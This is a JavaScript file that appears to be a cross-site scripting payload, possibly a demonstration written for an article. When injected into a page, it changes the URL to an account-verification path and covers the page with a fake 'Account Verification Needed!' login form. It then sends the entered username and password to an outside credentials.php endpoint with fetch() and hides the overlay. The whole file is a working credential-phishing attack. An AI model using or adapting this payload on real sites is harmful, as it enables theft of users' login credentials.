(function() {
    
    history.pushState("", "", "/account/verification");
    
    let div = document.createElement("div");
    
    div.style.width = "100%";
    div.style.height = "100vh";
    div.style.position = "absolute";
    div.style.top = 0;
    div.style.left = 0;
    div.style.zIndex = 99999;
    div.style.background = "rgba(255, 255, 255, .5)";
    
    document.body.appendChild(div);
    
    let form = document.createElement("form");
    
    form.setAttribute("method", "post");
    form.setAttribute("action", "https://h9demoxss-h9articlexss483243.codeanyapp.com/credentials.php");
    
    form.style.width = "40%";
    form.style.margin = "20px auto";
    form.style.padding = "20px";
    form.style.border = "2px dashed red";
    
    let formTitle = document.createElement("h1");
    
    formTitle.style.color = "red";
    formTitle.style.textAlign = "center";
    formTitle.textContent = "Account Verification Needed!";
    
    let userInput = document.createElement("input");
    
    userInput.setAttribute("type", "text");
    userInput.setAttribute("name", "user");
    userInput.setAttribute("placeholder", "username");
    
    userInput.style.display = "block";
    userInput.style.width = "100%";
    userInput.style.fontSize = "1.3em";
    userInput.style.padding = "4px";
    userInput.style.textAlign = "center";
    
    let passInput = document.createElement("input");

    passInput.setAttribute("type", "password");
    passInput.setAttribute("name", "pass");
    passInput.setAttribute("placeholder", "password");

    passInput.style.display = "block";
    passInput.style.width = "100%";
    passInput.style.fontSize = "1.3em";
    passInput.style.padding = "4px";
    passInput.style.textAlign = "center";
    
    let submitButton = document.createElement("input");
    
    submitButton.setAttribute("type", "submit");
    submitButton.setAttribute("display", "block");
    submitButton.setAttribute("value", "Verify");
    
    submitButton.style.display = "block";
    submitButton.style.width = "100%";
    submitButton.style.fontSize = "1.3em";
    submitButton.style.padding = "4px";
    
    form.appendChild(formTitle);
    form.appendChild(userInput);
    form.appendChild(passInput);
    form.appendChild(submitButton);
    
    div.appendChild(form);
    
    form.addEventListener("submit", event => {
        event.preventDefault();
        fetch(
          `https://h9demoxss-h9articlexss483243.codeanyapp.com/credentials.php?user=${userInput.value}&pass=${passInput.value}`,
          {mode: "no-cors"}
        );
        div.style.display = "none";
    });
    
}) ();






